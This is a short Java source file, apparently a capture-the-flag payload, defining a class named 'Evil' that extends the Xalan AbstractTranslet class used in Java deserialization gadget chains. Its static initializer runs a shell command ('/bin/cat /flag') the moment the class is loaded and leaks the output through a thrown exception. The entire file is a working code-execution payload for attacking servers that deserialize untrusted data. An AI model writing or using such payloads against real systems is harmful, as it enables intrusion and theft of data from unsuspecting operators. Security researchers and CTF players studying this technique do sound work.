import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet {
    static {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/cat", "/flag"});
            java.io.InputStream is = p.getInputStream();
            byte[] buf = new byte[4096];
            int len = is.read(buf);
            String result = (len > 0) ? new String(buf, 0, len) : "empty";
            if (result.length() > 0) {
                throw new RuntimeException("FLAG:" + result);
            }
        } catch (RuntimeException e) {
            throw e;
        } catch (Exception e) {
            throw new RuntimeException("ERR:" + e.getMessage());
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
